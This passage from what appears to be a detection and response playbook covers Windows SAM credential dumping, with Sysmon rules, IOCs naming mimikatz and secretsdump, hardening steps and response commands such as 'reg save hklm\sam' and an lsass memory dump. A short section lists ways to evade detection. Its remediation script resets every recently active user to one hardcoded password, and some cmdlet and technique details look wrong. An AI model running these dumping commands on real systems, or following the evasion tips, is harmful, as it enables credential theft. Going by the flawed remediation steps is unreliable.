- **Filter:** `ObjectName contains "SECURITY\SAM"` AND `ObjectType = "File" or "Key"`

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** All Windows versions

**Sysmon Configuration Snippet:**

```xml
<!-- Detect SAM file access/modification -->
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Event ID 11: FileCreate -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">C:\temp\SAM</TargetFilename>
    </FileCreate>
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">C:\Windows\Repair\SAM</TargetFilename>
    </FileCreate>
    
    <!-- Event ID 23: FileDelete -->
    <FileDelete onmatch="include">
      <TargetFilename condition="contains">SAM</TargetFilename>
    </FileDelete>
    
    <!-- Event ID 3: Network Connection (for secretsdump exfiltration) -->
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">445</DestinationPort>
      <Image condition="contains">secretsdump</Image>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with the XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Where-Object {$_.ID -eq 23}`

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious activity on accessed files detected" / "Credential dumping detected"

- **Severity:** High/Critical
- **Description:** Mimikatz, secretsdump, or similar tools accessing system files
- **Applies To:** Azure VMs with Defender for Servers enabled
- **Remediation:** Isolate VM; reset credentials; check audit logs for unauthorized access

**Manual Configuration Steps (Enable Defender):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
4. Click **Save**
5. Go to **Security alerts** to view triggered alerts

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### M365 Audit Query (if SAM extraction leads to M365 account compromise)

```powershell
# Search for suspicious sign-ins after SAM extraction
Search-UnifiedAuditLog -Operations "UserLoggedIn" `
  -StartDate (Get-Date).AddDays(-1) `
  -EndDate (Get-Date) `
  -ResultSize 1000 | `
  Export-Csv "C:\audit_suspicious_logins.csv"
```

- **Workload:** AzureActiveDirectory
- **Operations:** UserLoggedIn, AppLogon, AddDelegate
- **Details:** Look for impossible travel, new devices, anomalous IP addresses
- **Applies To:** M365 E3+ with unified audit log enabled

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement Local Administrator Password Solution (LAPS)**

Automatically manage and rotate local administrator passwords to prevent reuse across systems.

**Applies To Versions:** Server 2008 R2+ (LAPS compatible)

**Manual Steps (Server 2016-2025):**

1. Download LAPS: [Microsoft LAPS](https://www.microsoft.com/en-us/download/details.aspx?id=46899)
2. Install LAPS on domain controller and target machines
3. Open **Group Policy Management** (gpmc.msc)
4. Navigate to: **Computer Configuration** → **Policies** → **Administrative Templates** → **LAPS**
5. Enable: **"Enable Local Admin Password Management"**
   - Set password length: `20` characters minimum
   - Set password age: `1` day (daily rotation)
6. Configure storage location: **"Store passwords in Active Directory"**
7. Run `gpupdate /force` on target systems
8. Verify in AD: Each computer should have `ms-Mcs-AdmPwd` attribute with randomized password

**Manual Steps (PowerShell - LAPS Configuration):**

```powershell
# Install LAPS module
Import-Module ActiveDirectory

# Enable LAPS on an OU
Set-LAPSADComputerSelfPermission -Identity "CN=Computers,DC=contoso,DC=com"

# Grant permissions to read LAPS passwords
$AdminGroup = Get-ADGroup -Identity "Domain Admins"
Grant-LAPSADComputerSelfPermission -Identity "CN=Computers,DC=contoso,DC=com" -AllowedPrincipals $AdminGroup

# Verify LAPS status
Get-ADComputer -Filter {ms-Mcs-AdmPwd -like "*"} -Properties ms-Mcs-AdmPwd | Select-Object Name, @{Name="Password";Expression={$_."ms-Mcs-AdmPwd"}}
```

**Validation Command:**

```powershell
# Check if LAPS is managing local admin on target system
Get-LAPSComputerPassword -Identity <ComputerName>
```

**Expected Output (If Secure):**
```
ComputerName   : WORKSTATION01
Password       : aBc1DeF2GhI3JkL4MnO5PqR6
ExpirationTime : 2026-01-03 07:00:00
```

---

**2. Disable or Restrict Local Administrator Account**

Minimize local admin privilege surface by disabling unnecessary local admin accounts.

**Applies To Versions:** All Windows versions

**Manual Steps (Registry):**

```powershell
# Disable built-in Administrator account
Disable-LocalUser -Name Administrator

# Or via net command
net user Administrator /active:no

# Verify
Get-LocalUser -Name Administrator | Select Name, Enabled
```

**Validation:**

```powershell
# Should show: Enabled = False
Get-LocalUser -Name Administrator | Select Name, Enabled
```

---

**3. Enable Registry Auditing for SAM/SYSTEM/SECURITY Hives**

Detect unauthorized access attempts to credential storage locations.

**Applies To Versions:** All Windows versions

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit Registry** (Success and Failure)
4. Run `gpupdate /force`

**Manual Steps (PowerShell):**

```powershell
# Enable registry auditing via auditpol
auditpol /set /subcategory:"Registry" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Registry"
# Expected output: Registry Success and Failure
```

**Manual Steps (Registry SACL Configuration):**

```powershell
# Add audit ACL to SAM hive
$RegistryPath = "HKLM:\SECURITY"
$Acl = Get-Acl -Path "Registry::$RegistryPath"

# Create audit rule for Everyone - Full Control
$AuditRule = New-Object System.Security.AccessControl.RegistryAuditRule(
  "Everyone",
  [System.Security.AccessControl.RegistryRights]::FullControl,
  [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
  [System.Security.AccessControl.PropagationFlags]::None,
  [System.Security.AccessControl.AuditFlags]::Success -bor [System.Security.AccessControl.AuditFlags]::Failure
)

$Acl.AddAuditRule($AuditRule)
Set-Acl -Path "Registry::$RegistryPath" -AclObject $Acl
```

---

### Priority 2: HIGH

**4. Enforce Strong Local Administrator Passwords**

Implement complex password requirements for all local administrator accounts.

**Manual Steps:**

1. Open **Local Security Policy** (secpol.msc) or Group Policy (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
3. Configure:
   - **Minimum password length:** `20` characters (or higher)
   - **Password must meet complexity requirements:** Enabled
   - **Maximum password age:** `90` days
   - **Minimum password age:** `1` day
4. Apply to all systems

```powershell
# Enforce via PowerShell
secedit /export /cfg C:\secpol.cfg
(Get-Content C:\secpol.cfg).Replace("PasswordComplexity = 0", "PasswordComplexity = 1") | Set-Content C:\secpol.cfg
(Get-Content C:\secpol.cfg).Replace("MinimumPasswordLength = 0", "MinimumPasswordLength = 20") | Set-Content C:\secpol.cfg
secedit /configure /db C:\Windows\security\local.sdb /cfg C:\secpol.cfg
```

---

**5. Restrict Local Administrator Group Membership**

Limit accounts with local admin rights to prevent widespread compromise.

**Manual Steps:**

1. Open **Computer Management** (compmgmt.msc) or **Active Directory Users and Computers**
2. Navigate to: **Local Users and Groups** → **Groups** → **Administrators**
3. Remove unnecessary accounts (keep only essential admins)
4. Verify membership: `net localgroup Administrators`

```powershell
# Remove user from local admin group
Remove-LocalGroupMember -Group Administrators -Member "DOMAIN\User"

# Verify
Get-LocalGroupMember -Group Administrators
```

---

**6. Implement Conditional Access Policies (Hybrid/Cloud)**

Add multi-factor authentication and device compliance requirements for high-risk scenarios.

**Manual Steps (Azure AD/Entra ID):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Restrict High-Risk Credential Access`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **All cloud apps**
5. **Conditions:**
   - Sign-in risk: **High**
   - Device state: **Require hybrid Azure AD join**
6. **Access controls:**
   - Grant: **Require MFA** and **Mark device as compliant**
7. Enable: **On**
8. Click **Create**

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Processes:**
- `mimikatz.exe` (any location)
- `secretsdump.py` execution
- `reg.exe` with `save` and `sam`/`system` parameters
- `vssadmin.exe` execution (VSS exploitation)
- `cmd.exe` with `mklink` and "HarddiskVolumeShadowCopy" in arguments

**Files:**
- `C:\temp\SAM`, `C:\temp\SAM.hive`
- `C:\temp\SYSTEM`, `C:\temp\SYSTEM.hive`
- `C:\temp\SAM_VSS`, `C:\temp\SYSTEM_VSS` (symbolic links)
- Any .hive files in user-writable directories

**Registry:**
- Access to `HKLM\SAM` (Event ID 4663)
- Access to `HKLM\SYSTEM` for SysKey extraction

**Network:**
- SMB connections (port 445) with secretsdump.py or CrackMapExec
- Exfiltration of .hive files to external IPs

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` (Event IDs 4688, 4663, 4656)
- Temporary .hive files in `%TEMP%`, `C:\temp\`
- Deleted .hive file entries in MFT (use $Data recovery tools)

**Memory:**
- Mimikatz.exe process memory (contains decrypted hashes)
- LSASS.exe memory (if dumped)
- Registry hive images in memory

**Cloud (Hybrid):**
- Sentinel logs: SecurityEvent with EventID 4688, 4663
- Azure audit logs: Suspicious sign-ins from compromised local accounts

### Response Procedures

**1. Isolate (Immediate):**

```powershell
# Disable network adapter
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Or terminate RDP sessions
quser
rwinsta /server:HOSTNAME <SessionID>
```

**2. Collect Evidence:**

```powershell
# Export Security Event Log
wevtutil epl Security C:\Evidence\Security.evtx

# Capture memory dump (if Mimikatz suspected)
procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp

# Export registry hives
reg save hklm\sam C:\Evidence\SAM.hive
reg save hklm\system C:\Evidence\SYSTEM.hive
```

**3. Remediate:**

```powershell
# Reset all domain user passwords (critical!)
Get-ADUser -Filter {LastLogonDate -gt (Get-Date).AddDays(-7)} | `
  ForEach-Object {
    Set-ADAccountPassword -Identity $_ -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "TempPassword123!" -Force) -PassThru | `
    Set-ADUser -PasswordNotRequired $false
  }

# Reset local admin password
$NewPassword = ConvertTo-SecureString -AsPlainText "NewComplexPassword123!" -Force
Set-LocalUser -Name Administrator -Password $NewPassword
```

**4. Post-Incident Monitoring:**

```powershell
# Monitor for repeat attempts
$AlertQuery = @"
index=main sourcetype="WinEventLog:Security" EventCode=4688
  (CommandLine="*reg*sam*" OR CommandLine="*mimikatz*")
  earliest=-24h
"@

# Monitor Sentinel for suspicious logins
# See Sentinel queries section above
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing | Attacker gains initial foothold via malicious email |
| **2** | **Execution** | [T1204.002] User Execution | Victim executes payload |
| **3** | **Persistence** | [T1547.001] Boot or Logon Autostart | Malware creates persistent mechanism |
| **4** | **Privilege Escalation** | [T1548.002] Bypass User Account Control | Attacker escalates to SYSTEM via UAC bypass |
| **5** | **Credential Access** | **[CA-DUMP-005] SAM Extraction** | **Attacker extracts local admin hashes** |
| **6** | **Lateral Movement** | [T1570] Lateral Tool Transfer | Attacker uses hashes for Pass-the-Hash to other systems |
| **7** | **Impact** | [T1485] Data Destruction | Attacker exfiltrates sensitive data or deploys ransomware |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: APT28 – Credential Harvesting Campaign (2015-2018)

- **Target:** US Defense contractors, NATO entities
- **Timeline:** 2015-2018
- **Technique Status:** APT28 used SAM extraction (reg save commands) followed by gsecdump to harvest local admin credentials for lateral movement
- **Impact:** Persistent access to 30+ defense organizations; exfiltration of classified military specifications
- **Reference:** [MITRE ATT&CK - APT28](https://attack.mitre.org/groups/G0007/)

---

### Example 2: Wizard Spider – Ryuk Ransomware Deployment (2019-2020)

- **Target:** US healthcare, financial institutions
- **Timeline:** 2019-2020
- **Technique Status:** Wizard Spider used Mimikatz SAM dumping + Pass-the-Hash to move from initial compromise to domain admin, then deployed Ryuk
- **Impact:** $1.1B in ransomware payments; widespread hospital downtime
- **Reference:** [MITRE ATT&CK - Wizard Spider](https://attack.mitre.org/groups/G0102/)

---

### Example 3: HiveNightmare Exploitation in the Wild (2021)

- **Target:** Windows 10/11 systems globally
- **Timeline:** July 2021 - present
- **Technique Status:** CVE-2021-36934 (HiveNightmare) exploited via Volume Shadow Copy to extract SAM hashes without admin privileges. Used for privilege escalation and credential theft.
- **Impact:** Widespread exploitation reported by multiple threat actors; patched by Microsoft but still affects unpatched systems
- **Reference:** [SentinelOne HiveNightmare Analysis](https://www.sentinelone.com/blog/hivenightmare-protecting-windows-10-security-account-manager-against-cve-2021-36934/)

---

## 18. SIGNATURE DETECTION EVASION

### Detection Evasion Techniques

**1. Obfuscated Mimikatz:**
- Use modified/obfuscated versions (e.g., renamed DLLs, API unhooking)
- Execute from memory only (no disk drop)
- Bypass Windows Defender Exploit Guard

**2. Living-off-the-Land Alternatives:**
- Use native `reg.exe` for registry export (often whitelisted)
- Use `vssadmin` for shadow copy access (CVE-2021-36934)
- Leverage PowerShell remoting instead of direct tools

**3. Timing/Scheduling:**
- Execute during business hours to blend with normal traffic
- Distribute extraction across multiple sessions

**4. Token Manipulation:**
- Use legitimate process tokens to dump credentials
- Impersonate NETWORK SERVICE or LOCAL SYSTEM

### Recommended Detection Tuning

- **Whitelist legitimate processes:** Exclude backup software, antivirus tools that access SAM
- **Threshold adjustment:** Consider 1-2 registry SAM accesses as baseline before alerting
- **Exclude:** Automated compliance scanning tools

---
